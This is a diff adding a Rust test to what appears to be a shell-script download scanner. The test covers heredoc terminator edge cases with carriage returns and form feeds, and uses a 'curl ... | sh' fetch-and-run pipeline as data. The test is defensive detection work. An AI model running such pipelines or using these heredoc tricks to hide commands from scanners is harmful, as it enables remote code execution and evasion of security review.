@@ -1232,6 +1232,36 @@ fn download_pipeline_inside_a_command_substitution_is_a_review_signal() {
     assert!(!shell_file_has_download_signal(&piped_only));
 }
 
+/// Shown-only heredoc text is masked only where the shell ends the heredoc
+/// at the same line. The shells compare the terminator line byte for byte
+/// (a carriage return included) and end no word at a form feed or a carriage
+/// return inside the line. Ending a heredoc earlier than the shell let a
+/// later `cat <<Z` line, which is data to the shell, open a heredoc that hid
+/// a pipeline the shell runs.
+#[test]
+fn heredoc_that_ends_elsewhere_in_the_shell_is_not_masked() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let flagged = [
+        format!("cat <<EOF\nEOF\r\ncat <<Z\nEOF\n{pipeline}\nZ\n"),
+        format!("cat <<E\x0c\nE\x0c\n{pipeline}\nE\n"),
+        format!("cat <<E\x0cF\nE\x0cF\n{pipeline}\nE\n"),
+        format!("cat <<E\rF\nE\rF\n{pipeline}\nE\n"),
+    ];
+    let missed: Vec<&String> = flagged
+        .iter()
+        .filter(|body| !shell_file_has_download_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "shell file: {missed:#?}");
+    // CRLF lines end the word and the terminator alike: still shown-only.
+    for body in [
+        format!("cat <<EOF\r\n{pipeline}\r\nEOF\r\n"),
+        format!("cat <<'EOF'\r\n{pipeline}\r\nEOF\r\necho done\r\n"),
+    ] {
+        assert!(!shell_file_has_download_signal(&body), "{body:?}");
+    }
+}
+
 /// Reading substitutions must not cost the brace/function/subshell descent
 /// any of its budget. Before substitutions were read, piped substitutions
 /// used no budget, so a function in a later live heredoc body was still
